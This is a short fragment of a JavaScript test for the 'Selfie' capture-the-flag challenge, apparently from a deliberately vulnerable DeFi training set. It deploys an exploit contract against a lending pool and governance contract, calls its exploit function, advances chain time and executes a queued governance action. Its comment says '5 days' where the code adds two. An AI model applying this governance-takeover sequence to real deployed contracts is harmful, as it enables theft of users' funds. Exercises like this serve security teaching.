...
describe('[Challenge] Selfie', function () {
    ...
    it('Execution', async function () {
        const Contract = await ethers.getContractFactory('SelfieExploit');
        const contract = await Contract.connect(player).deploy(pool.address, governance.address, token.address)
        console.log(await contract.exploit(TOKENS_IN_POOL));
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
        await contract._run_actionid();
